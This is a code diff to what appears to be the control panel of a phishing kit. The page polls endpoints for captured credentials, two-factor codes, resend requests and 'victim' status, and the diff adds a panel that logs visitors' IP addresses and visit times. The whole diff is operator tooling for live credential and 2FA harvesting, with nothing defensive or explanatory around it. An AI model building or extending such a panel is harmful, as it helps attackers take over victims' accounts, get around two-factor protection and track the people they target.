@@ -528,6 +528,11 @@
         <div class="capture-list" id="2fa-codes"></div>
     </div>
     
+    <div class="glass-panel" style="margin-top: 24px;">
+        <div class="panel-title"><span>🌐</span> Visitor IPs</div>
+        <div class="capture-list" id="visitor-ips"></div>
+    </div>
+    
     <div class="settings-modal" id="settingsModal" onclick="closeSettings(event)">
         <div class="settings-content">
             <div class="settings-title">⚙️ Settings</div>
@@ -760,31 +765,35 @@
         let last2faLength = 0;
         let lastResendLength = 0;
         let lastVictimStatus = '';
+        let lastIpsLength = 0;
         
         setInterval(async () => {
-            const [credsRes, codesRes, resendRes, stateRes] = await Promise.all([
+            const [credsRes, codesRes, resendRes, stateRes, ipsRes] = await Promise.all([
                 fetch('/api/get-creds'),
                 fetch('/api/get-2fa'),
                 fetch('/api/get-resend-requests'),
-                fetch('/api/get-state')
+                fetch('/api/get-state'),
+                fetch('/api/get-ips')
             ]);
             
             const creds = await credsRes.json();
             const codes = await codesRes.json();
             const resends = await resendRes.json();
             const state = await stateRes.json();
+            const ips = await ipsRes.json();
             
             // Only rebuild UI if data changed
-            if (creds.length !== lastCredsLength || codes.length !== last2faLength || resends.length !== lastResendLength || state.status !== lastVictimStatus) {
+            if (creds.length !== lastCredsLength || codes.length !== last2faLength || resends.length !== lastResendLength || state.status !== lastVictimStatus || ips.length !== lastIpsLength) {
                 lastCredsLength = creds.length;
                 last2faLength = codes.length;
                 lastResendLength = resends.length;
                 lastVictimStatus = state.status;
-                renderAll(creds, codes, resends, state);
+                lastIpsLength = ips.length;
+                renderAll(creds, codes, resends, state, ips);
             }
         }, 1500);
         
-        function renderAll(creds, codes, resends, state) {
+        function renderAll(creds, codes, resends, state, ips = []) {
             document.getElementById('cred-count').textContent = creds.length;
             document.getElementById('2fa-count').textContent = codes.length;
             document.getElementById('resend-count').textContent = resends.length;
@@ -831,6 +840,18 @@
             }
             
             renderVictim(state);
+            
+            const ipsDiv = document.getElementById('visitor-ips');
+            if (ips.length === 0) {
+                ipsDiv.innerHTML = '<div class="empty-state">No visitors yet</div>';
+            } else {
+                ipsDiv.innerHTML = ips.map(ip => `
+                    <div class="capture-item">
+                        <div class="capture-row"><span class="capture-label">IP</span><span class="capture-value">${ip.ip}</span></div>
+                        <div class="capture-row"><span class="capture-label">Time</span><span class="capture-time">${ip.time}</span></div>
+                    </div>
+                `).join('');
+            }
         }
         
         function renderVictim(state) {
